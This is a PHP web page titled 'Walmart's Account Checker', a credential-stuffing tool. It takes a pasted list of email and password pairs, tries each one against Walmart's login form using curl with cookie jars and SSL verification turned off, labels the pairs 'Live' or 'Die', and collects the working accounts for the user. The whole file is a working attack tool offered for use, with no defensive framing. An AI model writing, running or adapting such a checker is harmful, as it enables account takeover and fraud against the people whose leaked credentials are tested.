<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en">
<head>
	<!-- no cache headers -->
	<meta http-equiv="Pragma" content="no-cache" />
	<meta http-equiv="Expires" content="-1" />
	<meta http-equiv="Cache-Control" content="no-cache" />
	<!-- end no cache headers -->
	<title>•••Walmart's Account Checker•••</title>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<style type="text/css">
		body
		{
			background-color: #333333;
			font-size: 10pt;
			font-family: Verdana;
		}
		body,td,th {
			color: #cccccc;
		}
		h1,h6
		{
			margin-bottom:10px;
			margin-top:0px;
		}
	</style>	
</head>
<?php
function curl($url,$post="",$usecookie = false,$header=false) {  
	$ch = curl_init();
	if($post) {
		curl_setopt($ch, CURLOPT_POST ,1);
		curl_setopt ($ch, CURLOPT_POSTFIELDS, $post);
	}
	curl_setopt($ch, CURLOPT_URL, $url); 
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.35 (KHTML, like Gecko) Ubuntu/10.10 Chromium/13.0.764.0 Chrome/13.0.764.0 Safari/534.35"); 
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	if ($usecookie) { 
		curl_setopt($ch, CURLOPT_COOKIEJAR, str_replace('\\','/',dirname(__FILE__)).'/'.$usecookie);
	curl_setopt($ch, CURLOPT_COOKIEFILE, str_replace('\\','/',dirname(__FILE__)).'/'.$usecookie);    
	} 
    if($header) { 
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(''.$header)); 
    }
	//curl_setopt($ch, CURLOPT_HEADER,1); 
	curl_setopt($ch, CURLOPT_RETURNTRANSFER,1); 
	$result=curl_exec ($ch); 
	curl_close ($ch); 
	return $result; 
}
function array_remove_empty($arr){
    $narr = array();
    while(list($key, $val) = each($arr)){
        if (is_array($val)){
            $val = array_remove_empty($val);
            // does the result array contain anything?
            if (count($val)!=0){
                // yes :-)
                $narr[$key] = trim($val);
            }
        }
        else {
            if (trim($val) != ""){
                $narr[$key] = trim($val);
            }
        }
    }
    unset($arr);
    return $narr;
}
function getStr($string,$start,$end){
	$str = explode($start,$string);
	$str = explode($end,$str[1]);
	return $str[0];
}
function inStr($s,$as){ 
        $s=strtoupper($s); 
        if(!is_array($as)) $as=array($as); 
        for($i=0;$i<count($as);$i++) if(strpos(($s),strtoupper($as[$i]))!==false) return true; 
        return false; 
} 
function xflush(){
    echo(str_repeat(' ',256));
    // check that buffer is actually set before flushing
    if (ob_get_length()){           
        @ob_flush();
        @flush();
        @ob_end_flush();
    }   
    @ob_start();
}
function get3Str($str1, $str2, $str3, $str) {
	$s = explode($str1, $str);
	if(count($s)<2) return $s[0];
	$s = explode($str2, $s[1]);
	if(count($s)<2) return $s[0];
	$s = explode($str3, $s[1]);
	return $s[0];
}
if(isset($_POST['submit'])) {
	$mp = $_POST['mp'];
	$delim = $_POST['delim'];
	$mail = $_POST['mail'];
	$pwd = $_POST['pwd'];
}
?>
<body>
<h1 align="center"><b style='color:green'>Walmart's Account Checker</b></h1>
<form method="post">
<div align="center"><textarea name="mp" cols="80" rows="10"><?php if(isset($mp)) echo $mp; else echo '1|2|3';?></textarea><br />
<b style='color:white'>Delim:</b> <input type="text" name="delim" value="<?php if(isset($delim)) echo $delim; else echo '|';?>" size="1" />&nbsp;
<b style='color:white'>Email:</b> <input type="text" name="mail" value="<?php if(isset($mail)) echo $mail; else echo 1;?>" size="1" />&nbsp;
<b style='color:white'>Password:</b> <input type="text" name="pwd" value="<?php if(isset($pwd)) echo $pwd; else echo 2;?>" size="1" />&nbsp;
<input type="checkbox" name="info" value="1" checked="checked" /><b style='color:white'>Get Information</b><br />
<input type="submit" value=" Bắt Đầu " name="submit" />
</div>
</form>
<?php
if(isset($_POST['submit'])){
	xflush();
	$mps = array_remove_empty(array_unique(explode("\n",trim($mp))));
	$total = count($mps);
	$live = array();
	foreach($mps AS $z => $mp){
		$cookie = "wal_".rand(100000, 999999).".txt";
		$xxxx = explode($_POST['delim'],$mp);
		if(count($xxxx)<2) continue;
		$email = trim($xxxx[$mail - 1]);
		$pass = trim($xxxx[$pwd - 1]);
		if(!$email || !$pass) continue;		
		$url = "http://www.walmart.com/cservice/ya_index.gsp";
		$s = curl($url, "", $cookie);
		$url = "https://www.walmart.com".get3Str('name="createAccountForm"', 'action="', '"', $s);
		$var = "userName=".urlencode($email)."&pwd=".$pass."";
		$s = curl($url, $var, $cookie);
		if(inStr($s,'The e-mail address and password')){
			$xyz = "<b style='color:red'>Die</b> | $email | $pass";
		} else {
			if(inStr($s, 'Order History')) {
				$xyz = "<b style='color:chartreuse'>Live</b> | $email | $pass";
				$live[] = "Live | $email | $pass";
			}
			else{
				$xyz = "<b style='color:red'>Can't check</b> | $email | $pass ";
			}
		}
		echo $xyz."<br />";
		unlink($cookie);
		xflush();
	}
	xflush();
	echo "<center><h3>Total: $total - Live: " . count($live) . "</h5>";
	echo "<textarea cols='60' rows='10' >".implode("\r\n",$live)."</textarea></center>";
}
?>
</body>
</html>